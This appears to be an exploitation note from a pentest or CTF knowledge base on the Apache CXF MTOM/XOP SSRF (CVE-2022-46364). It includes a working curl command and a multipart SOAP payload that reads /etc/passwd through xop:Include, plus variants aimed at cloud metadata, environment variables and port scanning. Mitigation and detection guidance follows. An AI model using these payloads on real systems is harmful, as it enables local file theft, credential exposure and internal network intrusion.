---
topic: Apache CXF — SSRF in MTOM/XOP (CVE-2022-46364)
tags: [web, apache-cxf, soap, mtom, xop, ssrf, cve-2022-46364]
---

# Apache CXF — SSRF in MTOM/XOP (CVE-2022-46364)

[🌐 Español](apache-cxf-mtom-ssrf.md) | **English**

## Concept

In an MTOM request, the SOAP body can include an `<xop:Include href="cid:...">` element referencing a MIME attachment. CXF resolved that `href` without limiting it to `cid:`, so a `file://` or `http://` value made the server read the resource and insert it into the parameter. That is SSRF plus local file read.

## When it applies

- SOAP service with Apache CXF older than 3.4.10 or 3.5.5.
- Operation with at least one string or object parameter.
- The endpoint accepts `multipart/related`.

## Procedure

1. Fetch the WSDL and find an operation with parameters.
2. Build a valid SOAP envelope and confirm the response.
3. Wrap the envelope as an `application/xop+xml` root part.
4. Replace a field with `<xop:Include href="file:///etc/passwd"/>`.
5. Send it with `Content-Type: multipart/related` and read the response.

## Commands

```bash
curl -s http://<IP>:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIME_boundary"' \
  --data-binary @poc.xml
```

```text
--MIME_boundary
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"
Content-Transfer-Encoding: 8bit
Content-ID: <root.message@cxf.apache.org>

<soapenv:Envelope ...>
  <soapenv:Body>
    <dev:submitReport>
      <arg0>
        <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/passwd"/></employeeName>
      </arg0>
    </dev:submitReport>
  </soapenv:Body>
</soapenv:Envelope>
--MIME_boundary
```

## Variants

- `href="http://169.254.169.254/..."` for cloud metadata.
- `href="file:///proc/self/environ"` for environment variables.
- Chain it with an internal service that returns credentials.
- Use the SSRF to scan localhost ports.

## Limitations

- Without `multipart/related`, CXF does not process XOP.
- The parameter must be of a type that accepts the `Include`.
- The file must be readable by the service user.
- Patched versions reject any `href` that is not `cid:`.

## Mitigation

- Upgrade CXF to 3.4.10/3.5.5 or later.
- Restrict `xop:Include` to `cid:` and validate the Content-ID.
- Block `file://`, `http://` and internal ranges in the parser.
- Run the service without access to sensitive files.

## Detection

- `multipart/related` requests with `xop:Include` and `file://`.
- `/etc/passwd` or key reads by the Java process.
- Outbound connections to metadata or localhost.
- Unmarshalling errors containing `unexpected element xop:Include`.

## References

- [Apache CXF — Security advisories](https://cxf.apache.org/security-advisories.html)
- [NVD — CVE-2022-46364](https://nvd.nist.gov/vuln/detail/CVE-2022-46364)
- [0xdf — DevArea](https://0xdf.gitlab.io/2026/07/04/htb-devarea.html)
